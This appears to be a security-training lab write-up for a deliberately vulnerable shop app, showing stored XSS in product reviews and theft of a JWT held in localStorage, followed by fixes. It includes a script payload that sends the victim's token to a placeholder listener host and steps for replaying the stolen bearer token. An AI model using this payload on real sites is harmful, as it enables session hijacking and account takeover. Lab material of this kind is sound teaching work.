# Lab 05: Stored XSS and token theft

Product reviews are stored raw and rendered with Jinja `|safe`. After login, the layout also writes the API JWT into `localStorage.bytebazaar_token`.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/) (XSS; also A07 when tokens live in JS-readable storage)

**Code:** `app/routes/shop.py` (`add_review`); `app/templates/shop/product.html`; `app/templates/layouts/base.html`

## Exploit

1. Sign in as bob / bob123 (or alice).
2. Open a product, e.g. `/products/null-pointer-tee`.
3. Post a review body:

```html
<script>alert(localStorage.getItem('bytebazaar_token'))</script>
```

Or exfiltrate to a listener you control:

```html
<script>
fetch('https://YOUR-LISTENER.example/steal?t=' +
  encodeURIComponent(localStorage.getItem('bytebazaar_token')));
</script>
```

4. Sign in as another user and open the same product. The stored script runs and reads **their** token.
5. Call `GET /api/v1/me` with `Authorization: Bearer <stolen-token>`.

## Fix

- Render with default escaping: `{{ r.body }}` (drop `|safe`), or a strict HTML sanitizer.
- Do not put bearer tokens in `localStorage`. Prefer httpOnly Secure cookies.
- CSP without `'unsafe-inline'` helps as defense in depth.

See `SAFE:` comments in the template and layout.
